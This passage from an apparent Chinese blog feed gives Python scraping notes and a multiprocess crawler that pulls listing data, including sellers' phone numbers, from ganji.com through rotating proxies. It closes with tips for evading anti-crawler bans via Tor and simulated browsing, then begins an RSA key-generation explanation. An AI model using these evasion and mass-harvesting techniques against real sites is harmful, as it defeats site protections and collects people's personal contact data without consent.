class="line"></div><div class="line">result = opener.open(gradeurl)</div><div class="line"></div><div class="line"><span class="keyword">print</span> ((result.read()).decode(<span class="string">'gbk'</span>))</div></pre></td></tr></table></figure>
<h2 id="16-利用正则表达式"><a href="#16-利用正则表达式" class="headerlink" title="16.利用正则表达式"></a>16.利用正则表达式</h2><h4 id="1-定义：正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。"><a href="#1-定义：正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。" class="headerlink" title="1.定义：正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。"></a>1.定义：正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</h4><p><img src="http://omg5mjb8v.bkt.clouddn.com/20130515113723855-e1424095177180.png" alt="正则表达式的语法规则"></p>
<h4 id="2-正则表达式的相关注解："><a href="#2-正则表达式的相关注解：" class="headerlink" title="2.正则表达式的相关注解："></a>2.正则表达式的相关注解：</h4><p>（1）数量词的贪婪模式与非贪婪模式</p>
<p>正则表达式通常用于在文本中查找匹配的字符串。Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符；非贪婪的则相反，总是尝试匹配尽可能少的字符。例如：正则表达式”ab<em>”如果用于查找”abbbc”，将找到”abbb”。而如果使用非贪婪的数量词”ab</em>?”，将找到”a”。</p>
<p>注：我们一般使用非贪婪模式来提取。</p>
<h3 id="（2）反斜杠问题"><a href="#（2）反斜杠问题" class="headerlink" title="（2）反斜杠问题"></a>（2）反斜杠问题</h3><p>与大多数编程语言相同，正则表达式里使用”\”作为转义字符，这就可能造成反斜杠困扰。假如你需要匹配文本中的字符”\”，那么使用编程语言表示的正则表达式里将需要4个反斜杠”\\”：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。</p>
<p>Python里的原生字符串很好地解决了这个问题，这个例子中的正则表达式可以使用r”\”表示。同样，匹配一个数字的”\d”可以写成r”\d”。有了原生字符串，妈妈也不用担心是不是漏写了反斜杠，写出来的表达式也更直观了。</p>
<h2 id="17-两种表达方式"><a href="#17-两种表达方式" class="headerlink" title="17.两种表达方式"></a>17.两种表达方式</h2><p>XPath:/html/body/div[2]/ul/li[1]/img</p>
<p>CSS Selector:body &gt; div.main-content &gt; li:nth-child(1) &gt; img</p>
<h2 id="18-同步和异步加载"><a href="#18-同步和异步加载" class="headerlink" title="18.同步和异步加载"></a>18.同步和异步加载</h2><p>它允许无阻塞资源加载，并且使 onload 启动更快，允许页面内容加载，而不需要刷新页面，也可以根据页面内容延迟加载依赖。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//异步加载</span></div><div class="line">&lt;strong&gt;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </div><div class="line">     <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  </div><div class="line">     s.type = <span class="string">'text/javascript'</span>;  </div><div class="line">     s.async = <span class="literal">true</span>;  </div><div class="line">     s.src = <span class="string">'http://yourdomain.com/script.js'</span>;  </div><div class="line">     <span class="keyword">var</span> x = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];  </div><div class="line">     x.parentNode.insertBefore(s, x);  </div><div class="line"> &#125;)();<span class="xml"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//同步加载</span></div><div class="line">&lt;script src=<span class="string">"http://XXX.com/script.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure>
<p>同步模式，又称阻塞模式，会阻止浏览器的后续处理，停止了后续的解析，因此停止了后续的文件加载（如图像）、渲染、代码执行。一般的script标签（不带async等属性）加载时会阻塞浏览器，也就是说，浏览器在下载或执行该js代码块时，后面的标签不会被解析，例如在head中添加一个script，但这个script下载时网络不稳定，很长时间没有下载完成对应的js文件，那么浏览器此时一直等待这个js文件下载，此时页面不会被渲染，用户看到的就是白屏。以前的一般建议是把<script>放在页面末尾</body>之前，这样尽可能减少这种阻塞行为，而先让页面展示出来。</p>
<h2 id="19-抓取异步加载的数据"><a href="#19-抓取异步加载的数据" class="headerlink" title="19.抓取异步加载的数据"></a>19.抓取异步加载的数据</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_more_data</span><span class="params">(start, end)</span>:</span></div><div class="line">    <span class="keyword">for</span> one <span class="keyword">in</span> range(start, end):</div><div class="line">        get_data(url+str(one))</div><div class="line">        tome.sleep(<span class="number">1</span>)</div></pre></td></tr></table></figure>
<h2 id="20-使用MongoDB进行排版和插入"><a href="#20-使用MongoDB进行排版和插入" class="headerlink" title="20.使用MongoDB进行排版和插入"></a>20.使用MongoDB进行排版和插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用mongodb进行简单的读取和插入</span></div><div class="line"><span class="keyword">import</span> pymongo</div><div class="line"></div><div class="line">client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line"></div><div class="line">DB = client[<span class="string">'DB'</span>]</div><div class="line"></div><div class="line">sheet_line = DB[<span class="string">'sheet_line'</span>]</div><div class="line"></div><div class="line">path = <span class="string">'/Users/mac/Desktop/1.md'</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(path, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    lines = f.readlines()</div><div class="line">    <span class="keyword">for</span> index,line <span class="keyword">in</span> enumerate(lines):</div><div class="line">        data=&#123;</div><div class="line">                <span class="string">'line'</span>  : line,</div><div class="line">                <span class="string">'index'</span> : index,</div><div class="line">                <span class="string">'words'</span> : len(line.split())</div><div class="line">             &#125;</div><div class="line">        print(data)</div><div class="line">        sheet_line.insert_one(data)</div></pre></td></tr></table></figure>
<p>几种表达式：</p>
<blockquote>
<p>$lt:less than</p>
<p>$gt:greater than</p>
<p>$lte:less than equal</p>
<p>$gte:greater than equal</p>
<p>$ne:not equal</p>
</blockquote>
<p>e.g-&gt;sheet.find{word:{‘$lt’:5}},表示找到sheet中所有字数比五小的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#找出字数小于等于三的行数并输出其内容</span></div><div class="line"><span class="keyword">for</span> item <span class="keyword">in</span> sheet_line.find&#123;word:&#123;<span class="string">'$lte'</span>:<span class="number">3</span>&#125;&#125;:</div><div class="line">    print(item[<span class="string">'line'</span>])</div></pre></td></tr></table></figure>
<h2 id="21-爬取大规模数据的工作流分析"><a href="#21-爬取大规模数据的工作流分析" class="headerlink" title="21.爬取大规模数据的工作流分析"></a>21.爬取大规模数据的工作流分析</h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/7B2E42E6-4839-4CCB-81FB-9D4785BDDA12.png" alt="" title="" class="">
                <p></p>
            </figure>
<p>在爬取大规模数据的时候，要分模块的去爬取</p>
<p>1.构造一个爬取所有网页的爬虫，将爬取到的网页存储到数据库中</p>
<p>2.再构造一个爬虫从数据中提取网址，爬取单个页面的信息</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#可以通过find方法来对不同的网页来进行适配,e.g:</span></div><div class="line"><span class="keyword">if</span> soup.find(<span class="string">'td'</span>,<span class="string">'t'</span>):</div><div class="line">	<span class="comment">#进行相关的爬取操作</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="comment">#在对数据库进行插入操作的时候，也可以通过键值对的模式</span></div><div class="line"> sheet_line.insert_one(&#123;<span class="string">'url'</span> : <span class="string">'http://www.xxx.com'</span>&#125;)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#将爬取的单个页面信息插入到数据库中</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_item_info</span><span class="params">(url)</span>:</span></div><div class="line">    web_data = requests.get(url)</div><div class="line">    soup = BeautifulSoup(web_data.text, <span class="string">'lxml'</span>)</div><div class="line">    title = soup.title.text</div><div class="line">    price = soup.select(<span class="string">'span.price.c_f50'</span>)[<span class="number">0</span>].text</div><div class="line">    date = soup.select(<span class="string">'.time'</span>)[<span class="number">0</span>].text</div><div class="line">    <span class="comment">#进一步容错的设置</span></div><div class="line">    area = list(soup.select(<span class="string">'.c_25d a'</span>)[<span class="number">0</span>].stripped_strings) <span class="keyword">if</span> soup.find_all(<span class="string">'span'</span>,<span class="string">'c_25d'</span>) <span class="keyword">else</span> <span class="keyword">None</span></div><div class="line">    item_info.insert_one(&#123;<span class="string">'title'</span>:title, <span class="string">'date'</span>:date, <span class="string">'area'</span>:area&#125;)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#对于404页面的判断，e.g:</span></div><div class="line"><span class="comment">#404页面示例</span></div><div class="line">&lt;script src=<span class="string">"http://www.douyu.com/js/404/jQuery-1.3.2.js"</span> type= <span class="string">"text/javascript"</span>&gt;</div><div class="line">no_longer_exist = <span class="string">'404'</span> <span class="keyword">in</span> soup.find(<span class="string">'script'</span>, type = <span class="string">"text/javascript"</span>).get(<span class="string">'src'</span>).split(<span class="string">'/'</span>)</div><div class="line"><span class="comment">#返回一个布尔型来判断，加上一个判断语句加入爬取页面信息的函数即可判断404</span></div></pre></td></tr></table></figure>
<h2 id="22-进程和线程"><a href="#22-进程和线程" class="headerlink" title="22.进程和线程"></a>22.进程和线程</h2><h3 id="形象的理解方式："><a href="#形象的理解方式：" class="headerlink" title="形象的理解方式："></a>形象的理解方式：</h3><blockquote>
<p>单进程单线程：一个餐馆里一张桌子一个人吃饭</p>
<p>单进程多线程：一个餐馆里一张桌子多个人吃饭</p>
<p>多进程单线程：一个餐馆里多张桌子，每张桌子一个人吃饭</p>
<p>多进程多线程：一个餐馆里多张桌子，每个桌子多个人吃法</p>
</blockquote>
<h2 id="23-多进程爬虫数据抓取"><a href="#23-多进程爬虫数据抓取" class="headerlink" title="23.多进程爬虫数据抓取"></a>23.多进程爬虫数据抓取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#需要用到的库</span></div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="keyword">from</span> channel_extract <span class="keyword">import</span> channel_list</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_links_from</span><span class="params">(channel)</span>:</span></div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</div><div class="line">        get_link_from(channel,num)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pool = Pool()</div><div class="line">    pool.map(get_all_links_from,channel_list.split())</div></pre></td></tr></table></figure>
<h3 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h3><p>map(function,interable,…):对于可迭代函数’iterable’中的每一个元素应用’function’方法，将结果作为list返回</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">e.g1-&gt;def add100(x):</div><div class="line">    	return x + 100</div><div class="line">    hh = [11,22,33]</div><div class="line">    hhh = map(add100,hh)</div><div class="line">#此时hhh的值为[111,122,133]</div><div class="line">#如果给出了额外的可迭代参数，则对每个可迭代参数中的元素‘并行’的应用‘function’。</div><div class="line">e.g2-&gt;def abc(a,b,c)</div><div class="line">	  	return a*10000 + b*100 + c</div><div class="line">	  list1 = [11,22,33]</div><div class="line">      list2 = [44,55,66]</div><div class="line">      list3 = [77,88,99]</div><div class="line">      hh = map(abc,list1,list2,list3)</div><div class="line">#此时hh的值为[114477,225588,336699],在每个list中，取出了下标相同的元素，执行了abc()。</div><div class="line">#如果'function'给出的是‘None’，自动假定一个‘identity’函数</div><div class="line">&gt;&gt;&gt; list1 = [11,22,33]</div><div class="line">&gt;&gt;&gt; map(None,list1)</div><div class="line">[11, 22, 33]</div><div class="line">&gt;&gt;&gt; list1 = [11,22,33]</div><div class="line">&gt;&gt;&gt; list2 = [44,55,66]</div><div class="line">&gt;&gt;&gt; list3 = [77,88,99]</div><div class="line">&gt;&gt;&gt; map(None,list1,list2,list3)</div><div class="line">[(11, 44, 77), (22, 55, 88), (33, 66, 99)]</div></pre></td></tr></table></figure>
<h2 id="24-爬取大规模数据实例代码"><a href="#24-爬取大规模数据实例代码" class="headerlink" title="24.爬取大规模数据实例代码"></a>24.爬取大规模数据实例代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#page_parsing.py</span></div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> pymongo</div><div class="line"></div><div class="line">client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line"></div><div class="line">ganji = client[<span class="string">'ganji'</span>]</div><div class="line"></div><div class="line">url_list = ganji[<span class="string">'url_list'</span>]</div><div class="line"></div><div class="line">item_info = ganji[<span class="string">'item_info'</span>]</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36'</span>,</div><div class="line">    <span class="string">'Connection'</span> : <span class="string">'keep-alive'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">proxy_list = [</div><div class="line">    <span class="string">'http://121.232.147.178:9000'</span>,</div><div class="line">    <span class="string">'http://122.243.11.57:9000'</span>,</div><div class="line">    <span class="string">'http://121.232.145.163:9000'</span></div><div class="line">]</div><div class="line">proxy_ip = random.choice(proxy_list)</div><div class="line">proxies = &#123;<span class="string">'http'</span> : proxy_ip&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_links_from</span><span class="params">(channel,pages,who_sells=<span class="string">'o'</span>)</span>:</span></div><div class="line">    list_view = <span class="string">'&#123;&#125;/&#123;&#125;&#123;&#125;/'</span>.format(channel, str(who_sells), str(pages))</div><div class="line">    wb_data = requests.get(channel, headers=headers)</div><div class="line">    soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">    <span class="keyword">if</span> soup.find(<span class="string">'ul'</span>, <span class="string">'pageLink'</span>):</div><div class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> soup.select(<span class="string">'td.t &gt; a.t'</span>):</div><div class="line">            item_link = link.get(<span class="string">'href'</span>).split(<span class="string">'?'</span>)[<span class="number">0</span>]</div><div class="line">            <span class="comment">#url_list.insert_one(&#123;'url':item_link&#125;)</span></div><div class="line">            <span class="comment">#print(item_link)</span></div><div class="line">            get_item_info_from(item_link)</div><div class="line">            print(<span class="string">'\n'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment">#已经到达最后一页</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_item_info_from</span><span class="params">(url, data=None)</span>:</span></div><div class="line">    wb_data = requests.get(url, headers=headers)</div><div class="line">    <span class="keyword">if</span> wb_data.status_code == <span class="number">404</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">            data = &#123;</div><div class="line">                <span class="string">'title'</span>:soup.title.text.strip(),</div><div class="line">                <span class="string">'price'</span>:soup.select(<span class="string">'.f22.fc-orange.f-type'</span>)[<span class="number">0</span>].text.strip(),</div><div class="line">                <span class="string">'pub_data'</span>:soup.select(<span class="string">'.pr-5'</span>)[<span class="number">0</span>].text.strip().split()[<span class="number">0</span>],</div><div class="line">                <span class="string">'area'</span>:list(map(<span class="keyword">lambda</span> x:x.text, soup.select(<span class="string">'ul.det-infor &gt; li &gt; a'</span>))),</div><div class="line">                <span class="string">'phoneNumber'</span>:soup.select(<span class="string">'span.phoneNum-style'</span>)[<span class="number">0</span>].text.strip(),</div><div class="line">                <span class="string">'url'</span>:url</div><div class="line">            &#125;</div><div class="line">            print(data)</div><div class="line">        <span class="comment">#except IndexError:</span></div><div class="line">            <span class="keyword">pass</span></div><div class="line">        <span class="keyword">except</span> AttributeError:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="comment">#get_item_info_from('http://bj.ganji.com/shouji/29096013665341x.htm')</span></div><div class="line"><span class="comment">#get_links_from('http://bj.ganji.com/shouji',2)</span></div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#channel_extracing.py</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span>  BeautifulSoup</div><div class="line"></div><div class="line">start_url = <span class="string">'http://bj.ganji.com/wu'</span></div><div class="line">url_host = <span class="string">'http://bj.ganji.com'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index_url</span><span class="params">(url)</span>:</span></div><div class="line">    wb_data = requests.get(url)</div><div class="line">    soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">    links = soup.select(<span class="string">'.fenlei &gt; dt &gt; a'</span>)</div><div class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</div><div class="line">        page_url = url_host + link.get(<span class="string">'href'</span>)</div><div class="line">        print(page_url)</div><div class="line"></div><div class="line"><span class="comment">#get_index_url(start_url)</span></div><div class="line"></div><div class="line">channel_list = <span class="string">'''</div><div class="line">http://bj.ganji.com/jiaju/</div><div class="line">http://bj.ganji.com/rirongbaihuo/</div><div class="line">http://bj.ganji.com/shouji/</div><div class="line">http://bj.ganji.com/shoujihaoma/</div><div class="line">http://bj.ganji.com/bangong/</div><div class="line">http://bj.ganji.com/nongyongpin/</div><div class="line">http://bj.ganji.com/jiadian/</div><div class="line">http://bj.ganji.com/ershoubijibendiannao/</div><div class="line">http://bj.ganji.com/ruanjiantushu/</div><div class="line">http://bj.ganji.com/yingyouyunfu/</div><div class="line">http://bj.ganji.com/diannao/</div><div class="line">http://bj.ganji.com/xianzhilipin/</div><div class="line">http://bj.ganji.com/fushixiaobaxuemao/</div><div class="line">http://bj.ganji.com/meironghuazhuang/</div><div class="line">http://bj.ganji.com/shuma/</div><div class="line">http://bj.ganji.com/laonianyongpin/</div><div class="line">http://bj.ganji.com/xuniwupin/</div><div class="line">http://bj.ganji.com/qitawupin/</div><div class="line">http://bj.ganji.com/ershoufree/</div><div class="line">http://bj.ganji.com/wupinjiaohuan/</div><div class="line">'''</span></div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#main.py</span></div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="keyword">from</span> channel_extracing <span class="keyword">import</span> channel_list</div><div class="line"><span class="keyword">from</span> page_parsing <span class="keyword">import</span> get_item_info_from,get_links_from,url_list,item_info</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_links</span><span class="params">(channel)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</div><div class="line">        get_links_from(channel, i)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pool = Pool()</div><div class="line">    pool.map(get_all_links, channel_list.split())</div><div class="line">    pool.close()</div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<h2 id="25-更新数据库"><a href="#25-更新数据库" class="headerlink" title="25.更新数据库"></a>25.更新数据库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">db.collection.update()</div><div class="line"><span class="comment">#update函数的用法,一般传入两个参数</span></div><div class="line">update(&#123;id:<span class="number">1</span>&#125;,&#123;$set:&#123;name:<span class="number">2</span>&#125;&#125;)</div></pre></td></tr></table></figure>
<h2 id="26-突破爬虫封禁的几种方法参考"><a href="#26-突破爬虫封禁的几种方法参考" class="headerlink" title="26.突破爬虫封禁的几种方法参考"></a>26.突破爬虫封禁的几种方法<a href="http://bigsec.com/bigsec-news/wechat-2016-web-crawler?ref=bigsec-news1">参考</a></h2><p>1.构造合理的HTTP头部请求</p>
<p>2.学会正确的设置cookie</p>
<p>3.正确的时间访问路径（不能访问过快）</p>
<p>4.隐含输入字段值（honey pot）</p>
<p>5.使用可变的远程ip（Tor代理服务器，防止ip被ban）</p>
<p>6.动态页面模拟人为操作（selenium+phantomJS框架）</p>
</script></p>]]></content>
      
        <categories>
            
            <category> 爬虫初步 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RSA密钥生成的过程(数学证明)]]></title>
      <url>/2017/05/12/RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E7%9A%84%E8%BF%87%E7%A8%8B-%E6%95%B0%E5%AD%A6%E8%AF%81%E6%98%8E/</url>
      <content type="html"><![CDATA[<p>RSA算法分析<br><a id="more"></a></p>
<h1 id="RSA密钥生成的过程-数学证明"><a href="#RSA密钥生成的过程-数学证明" class="headerlink" title="RSA密钥生成的过程(数学证明)"></a>RSA密钥生成的过程(数学证明)</h1><p>1.随机生成两个不相等的质数p和q。</p>
<p>2.计算着两个质数的乘积n。</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　n = p × q</div></pre></td></tr></table></figure>
<p>3.计算n的欧拉函数</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">φ(n) = (p<span class="number">-1</span>)(q<span class="number">-1</span>)</div></pre></td></tr></table></figure>
<p>4.随机选择一个整数e,条件是1 &lt; e &lt; φ(n)，且e与φ(n) 互质。</p>
<p>5.计算e对于φ(n)的模反元素d。</p>
<p>所谓<a href="http://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0" target="_blank" rel="external">“模反元素”</a>就是指有一个整数d，可以使得ed被φ(n)除的余数为1。</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ed ≡ <span class="number">1</span> (mod φ(n))</div></pre></td></tr></table></figure>
<p>这个式子等价于</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　ed - <span class="number">1</span> = kφ(n)</div></pre></td></tr></table></figure>
<p>于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ex + φ(n)y = <span class="number">1</span></div></pre></td></tr></table></figure>
<p>如果已知 e=a, φ(n)=b，</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ax + by = <span class="number">1</span></div></pre></td></tr></table></figure>
<p>这个方程可以用<a href="http://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95" target="_blank" rel="external">“扩展欧几里得算法”</a>求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。</p>
<p>至此所有计算完成。</p>
<p>6.将n和e封装成公钥，n和d封装成私钥。 </p>
<p>在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。</p>
<p>实际应用中，公钥和私钥的数据都采用<a href="http://zh.wikipedia.org/zh-cn/ASN.1" target="_blank" rel="external">ASN.1</a>格式表达（<a href="http://hi.baidu.com/mathack/item/d0ad4cc1514a3663f7c95da2" target="_blank" rel="external">实例</a>）。</p>
<p>7.RSA算法的可靠性</p>
<p>回顾上面的密钥生成步骤，一共出现六个数字：</p>
<blockquote>
<p>　　p<br>　　q<br>　　n<br>　　φ(n)<br>　　e<br>　　d</p>
</blockquote>
<p>这六个数字之中，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。</p>
<p>那么，有无可能在已知n和e的情况下，推导出d？</p>
